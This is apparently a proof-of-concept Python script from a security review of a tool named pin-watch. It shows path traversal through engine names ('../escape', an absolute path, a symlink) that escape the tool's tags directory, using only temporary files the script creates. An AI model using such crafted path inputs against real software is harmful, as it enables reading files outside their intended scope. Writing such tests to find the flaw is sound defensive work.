#!/usr/bin/env python3
"""PoC: path traversal via engine names in --tags-dir (pin-watch read_tags)."""
import importlib.util, os, tempfile

spec = importlib.util.spec_from_file_location(
    "pinwatch", "/fast/scratch/kama-r41/clone/tools/pin-watch.py")
pw = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pw)

root = tempfile.mkdtemp(prefix="r41b08-trav-")
os.makedirs(os.path.join(root, "tags"))
O = "0" * 40

def w(path, body):
    with open(path, "w") as fh:
        fh.write(body)

# 1) normal engine -> tags/<engine>.txt
w(os.path.join(root, "tags", "ok.txt"), f"{O}\trefs/tags/v1.0.0\n")

# 2) ../ escape: engine "escape" is one dir up from tags-dir
w(os.path.join(root, "escape.txt"), f"{O}\trefs/tags/v9.9.9\n")

# 3) absolute path: engine = "<root>/victim" -> join discards tags-dir prefix
w(os.path.join(root, "victim.txt"), f"{O}\trefs/tags/v8.8.8\n")

# 4) symlink inside tags-dir pointing outside (target need not end .txt)
os.symlink(os.path.join(root, "escape.txt"), os.path.join(root, "tags", "ln.txt"))

def row(engine, regex=r"v(\d+)\.(\d+)\.(\d+)", pin="v1.0.0"):
    return dict(engine=engine, repo="https://example.invalid/x.git", rx=__import__("re").compile(regex), pin=pin, source="S000")

cases = [
    ("ok",      "ok"),
    ("../escape", "../escape"),
    (root+"/victim", "<abs>/victim"),
    ("ln",      "ln"),
    ("../escap", "../escap"),   # non-existent -> None -> error
]
for label, engine in cases:
    out, code = pw.check([row(engine)], os.path.join(root, "tags"))
    print(f"{label:12} engine={engine!r:20} -> {out[0]}  (exit {code})")
